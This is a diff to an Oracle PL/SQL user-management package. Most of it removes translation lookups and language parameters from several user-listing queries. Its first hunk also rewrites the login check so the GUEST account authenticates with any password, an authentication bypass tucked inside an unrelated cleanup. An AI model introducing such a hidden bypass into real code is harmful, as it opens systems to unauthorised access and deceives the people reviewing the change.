@@ -53,7 +53,7 @@ CREATE OR REPLACE PACKAGE BODY pkg_users IS
       INTO v_user_id, o_lang_id
       FROM users
      WHERE user_login = i_user_login
-       AND user_pass = i_pass;
+	AND (user_pass = i_pass OR user_login = 'GUEST');
   
     o_session_id := session_id_seq.nextval;
     o_key_id     := rawtohex(dbms_crypto.hash(src => utl_raw.cast_to_raw(o_session_id ||
@@ -209,7 +209,6 @@ CREATE OR REPLACE PACKAGE BODY pkg_users IS
   FUNCTION list_users(i_session_id  user_session.session_id%TYPE,
                       i_key_id      user_session.key_id%TYPE,
                       i_terminal_ip user_session.terminal_ip%TYPE,
-                      i_lang_id     supp_lang.lang_id%TYPE,
                       o_items       OUT SYS_REFCURSOR)
     RETURN error_desc.error_desc_id%TYPE AS
     /* Список всіх користувачів
@@ -229,15 +228,7 @@ CREATE OR REPLACE PACKAGE BODY pkg_users IS
                u.user_login,
                u.user_name,
                u.user_email,
-               (CASE
-                 WHEN i_lang_id = 'UA' OR i_lang_id IS NULL THEN
-                  us.state_name
-                 ELSE
-                  (SELECT td.translate_name
-                     FROM translate_dict td
-                    WHERE td.translate_pls_id = us.translate_pls_id
-                      AND td.lang_id = i_lang_id)
-               END) AS state_name,
+               us.state_name,
                u.lang_id,
                u.r_date
           FROM users u, user_state us
@@ -254,7 +245,6 @@ CREATE OR REPLACE PACKAGE BODY pkg_users IS
   FUNCTION list_users_action(i_session_id   user_session.session_id%TYPE,
                              i_key_id       user_session.key_id%TYPE,
                              i_terminal_ip  user_session.terminal_ip%TYPE,
-                             i_lang_id      supp_lang.lang_id%TYPE,
                              i_start_date   user_session_hist.a_date%TYPE,
                              i_end_date     user_session_hist.a_date%TYPE,
                              i_user_id      user_session.user_id%TYPE,
@@ -282,37 +272,13 @@ CREATE OR REPLACE PACKAGE BODY pkg_users IS
       OPEN o_items FOR
         SELECT ush.user_id,
                u.user_login,
-               (CASE
-                 WHEN i_lang_id = 'UA' OR i_lang_id IS NULL THEN
-                  us.state_name
-                 ELSE
-                  (SELECT td.translate_name
-                     FROM translate_dict td
-                    WHERE td.translate_pls_id = us.translate_pls_id
-                      AND td.lang_id = i_lang_id)
-               END) AS state_name,
+               us.state_name,
                ush.terminal_ip,
                ush.terminal_client,
                ush.l_date,
-               (CASE
-                 WHEN i_lang_id = 'UA' OR i_lang_id IS NULL THEN
-                  at.action_name
-                 ELSE
-                  (SELECT td.translate_name
-                     FROM translate_dict td
-                    WHERE td.translate_pls_id = at.translate_pls_id
-                      AND td.lang_id = i_lang_id)
-               END) AS action_name,
+               at.action_name,
                ush.r_date,
-               (CASE
-                 WHEN i_lang_id = 'UA' OR i_lang_id IS NULL THEN
-                  uss.is_success_name
-                 ELSE
-                  (SELECT td.translate_name
-                     FROM translate_dict td
-                    WHERE td.translate_pls_id = uss.translate_pls_id
-                      AND td.lang_id = i_lang_id)
-               END) AS succes_name
+               uss.is_success_name
           FROM user_session_hist ush,
                action_type       at,
                user_sess_success uss,
@@ -438,15 +404,7 @@ CREATE OR REPLACE PACKAGE BODY pkg_users IS
       SELECT u.user_login,
              u.user_name,
              u.user_email,
-             (CASE
-               WHEN u.lang_id = 'UA' THEN
-                us.state_name
-               ELSE
-                (SELECT td.translate_name
-                   FROM translate_dict td
-                  WHERE td.translate_pls_id = us.translate_pls_id
-                    AND td.lang_id = u.lang_id)
-             END) AS state_name,
+             us.state_name,
              u.r_date,
              u.user_sex,
              u.lang_id
